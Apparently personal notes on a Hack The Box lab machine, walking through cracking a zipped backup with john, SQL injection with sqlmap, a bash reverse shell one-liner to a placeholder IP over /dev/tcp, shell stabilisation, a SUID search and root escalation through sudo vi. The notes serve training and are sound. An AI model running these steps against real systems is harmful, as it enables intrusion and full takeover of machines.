#hackthebox #privesc #lab #sqli 

On a ftp server we find a public backup.zip file, we download it.

It is password protected, but we can try cracking it with john.

```
zip2john backup.zip backup_hash.txt
```

then we run john with rockyou to find the source code of the website. It contains hardcoded credentials, so we get admin on the web application.

Then web application has a search functionality, which we can get a sql injection on. 

- Note i think i would have struggled to do it manually, but sqlmap is op and finds the vuln with no custom options. 

No we have a sqlmap --os-shell, which is not too good, we should try to update our shell - since the sqlmap shell it not so stabile. 

First, we can get a reverse shell with this payload:

```
bash -c "bash -i& /dev/tcp/{ip}/42069 0>&1"
```
- OR pick any of these: https://www.revshells.com/ 

We can improve it further with these:
```
python3 -c 'import
pty;pty.spawn("/bin/bash")'

CTRL+Z

stty raw -echo

fg

export TERM=xterm
```

Once we have a good enough shell, we want to privsec. There are many ways to do this, but some staring points are:
- looking for s-bits: 
```
find / -type f -perm -u=s 2>/dev/null
```

- sudo -l (Most likely require a password)
- look at logs, config source code

In this case we found hardcoded login creds in the source code, which lets us ssh into the machine is postgres user.

Then we can use sudo -l to figure out we can run /bin/vi with sudo for a spesific file: **/bin/vi /etc/postgresql/11/main/pg_hba.conf**

When we find a program we can run with sudo, we check if we can find it here: https://gtfobins.org/ 

Here the trick is to open the 1 file we can sudo with, then run:
```
set shell=/bin/sh
shell
```

We a process with vi as root, then spawn a new shell from within this process, and by inheritance this becomes a root shell (?) - it did not work do directly open it as a root shell via vi. 



